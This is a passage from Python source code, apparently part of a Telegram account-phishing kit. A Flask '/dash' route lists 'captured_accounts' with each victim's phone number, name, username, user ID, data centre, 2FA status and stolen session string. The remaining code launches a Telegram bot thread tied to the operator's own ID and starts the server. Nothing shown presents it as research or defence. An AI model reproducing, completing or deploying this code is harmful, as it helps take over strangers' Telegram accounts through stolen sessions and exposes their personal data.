        'session': a['session'], 'session_length': len(a['session']),
        'has_2fa': a.get('has_2fa', False)})


@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    rows = ""
    for i, a in enumerate(captured_accounts, 1):
        sl = len(a.get('session', ''))
        t = "2FA" if a.get('has_2fa') else ""
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{t} ({sl})</td></tr>"
    return ("<!DOCTYPE html><html><head><title>Dash</title><style>"
        "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
        "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
        "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
        "th{background:#141420;color:#ddd}</style></head><body>"
        f"<h1>Accounts: {len(captured_accounts)}</h1>"
        "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th></tr></thead><tbody>"
        f"{rows if rows else '<tr><td colspan=7 style=text-align:center;padding:30px>Empty</td></tr>'}"
        "</tbody></table></body></html>")


# ============================================================
# START BOT
# ============================================================
def _run_bot():
    try:
        logger.info("Starting bot thread...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(bot_main())
    except Exception as e:
        logger.error(f"BOT CRASH: {type(e).__name__}: {e}")
        logger.error(traceback.format_exc())


if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
    _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="telegram-bot")
    _bot_thread.start()
    logger.info("Bot background thread launched")
else:
    _bot_thread = None
    logger.error("Bot NOT started — env vars missing")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
